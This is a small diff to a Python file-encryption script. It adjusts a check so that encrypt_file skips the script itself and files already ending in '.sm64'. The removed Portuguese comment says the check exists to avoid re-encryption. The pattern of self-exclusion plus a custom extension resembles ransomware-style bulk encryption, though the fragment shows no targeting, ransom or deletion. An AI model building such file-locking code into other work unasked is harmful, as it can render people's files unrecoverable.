@@ -22,8 +22,8 @@ def derive_key(password: str, salt: bytes) -> bytes:
     return key
 
 def encrypt_file(file_path, password):
-    if file_path == SCRIPT_PATH or file_path.endswith(".sm64"):
-        return  # Evita criptografar o próprio script e arquivos já criptografados
+    if os.path.basename(file_path) == os.path.basename(SCRIPT_PATH) or file_path.endswith(".sm64"):
+        return
 
     try:
         with open(file_path, "rb") as f:
